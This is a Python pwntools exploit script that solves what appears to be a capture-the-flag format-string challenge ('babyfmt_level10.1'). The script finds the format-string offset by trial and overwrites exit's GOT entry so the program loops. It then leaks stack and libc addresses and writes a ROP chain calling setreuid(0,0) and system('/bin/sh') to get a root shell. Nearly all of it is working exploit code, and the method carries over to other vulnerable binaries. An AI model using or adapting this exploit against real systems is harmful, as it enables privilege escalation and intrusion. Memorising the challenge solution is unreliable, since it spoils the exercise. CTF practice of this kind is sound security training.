# idea: exit@plt is called after printf. No PIE, partial RELRO. write func addr in to exit@got to get a looping func (and hence infinite printf)
# 1. leak rbp in net loop by current saved rbp - 0xaa0
# 2. write to final rbp (saved rbp for main) + 0x8 i.e. the final ret addr the rop chain: puts@plt(puts@got); func to: i. leak libc addr; ii. set the true rop chain (system(/bin/sh)) in the ret of next loop
# 3. write (leave; ret) to exit@got, the program will return to main and start rop chain


from pwn import *

context.arch = 'amd64'

def get_offset():
    dummy = b"aaaabaaacaaadaaaeaaa"
    for i in range(6, 100):
        p = process("/challenge/babyfmt_level10.1")
        print(p.recv())
        p.send(dummy + b"INIT" + b"%" + f'{i:d}'.encode('utf-8') + b"$pFINI")
        p.recvuntil(b"Your input is:")
        p.recvline()
        output = p.recv()
        print(output)
        p.close()
        if b"616161" in output:
            # either in offset or in padding
            leak = output[output.index(b"INIT") + 4 : output.index(b"FINI")]
            leak = leak[2:]
            if leak[-2:] != b'61' and leak[-2:] != b'62':
                # we are in padding
                continue
            else:
                leak = bytes.fromhex(leak.decode())[::-1]
                padlen = cyclic_find(leak)
                return padlen, i


padlen, offset = get_offset()
print(padlen)
print(offset)
prefix_length = 35 # the string prefix in printf
elf = ELF("/challenge/babyfmt_level10.1")

rop = ROP(elf)

#p = gdb.debug("/challenge/babyfmt_level10.1", gdbscript='''b *func+227
#b *main+378
#''')
p = process("/challenge/babyfmt_level10.1")

# write func to exit@got
payload = b"A" * padlen + fmtstr_payload(offset, {elf.got['exit']: elf.sym['func']}, numbwritten = prefix_length + padlen)
p.send(payload)
p.recvuntil(b"Your input is:")
p.recvline()
p.recv()

# leak stack addr
payload = b"A" * padlen + b"%174$p"
p.send(payload)
p.recvuntil(b"Your input is:")
p.recvline()
output = p.recvregex(br'0x[0-9a-z]{12}')[-14:]
main_rbp = int(output, 16) - 0x550 - 0x550 - 0x550
main_ret = main_rbp + 0x8

# set next stage payload + leak libc addr
# 0x401528: leave ; ret
pop_rdi = rop.rdi.address
leave_ret = 0x401528

rop.raw(pop_rdi)
rop.raw(elf.got['puts'])
rop.raw(elf.plt['puts'])
rop.raw(elf.sym['func'])

print("main rbp : {}".format(hex(main_rbp)))
print("main ret loc: {}".format(hex(main_ret)))
payload = b"A" * padlen + fmtstr_payload(offset, {elf.got['exit']: leave_ret, main_ret: rop.chain()}, numbwritten = prefix_length + padlen)
p.send(payload)
p.recvuntil(b"Your input is:")
p.recvline()
puts_addr = unpack(p.recvuntil(b'\n')[-7:-1], 'all')
print("puts addr = {}".format(hex(puts_addr)))

# system(/bin/sh)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = puts_addr - libc.symbols['puts']
print("libc base = {}".format(hex(libc.address)))

bin_sh = next(libc.search(b'/bin/sh'))
libc_rop = ROP(libc)
libc_rop.setreuid(0, 0)
libc_rop.system(bin_sh)

payload = b"A" * padlen + fmtstr_payload(offset, {elf.got['exit']: leave_ret, main_ret: libc_rop.chain()}, numbwritten = prefix_length + padlen) # # of written bytes need to include payload in previous loops
print(payload)
p.send(payload)
p.interactive()
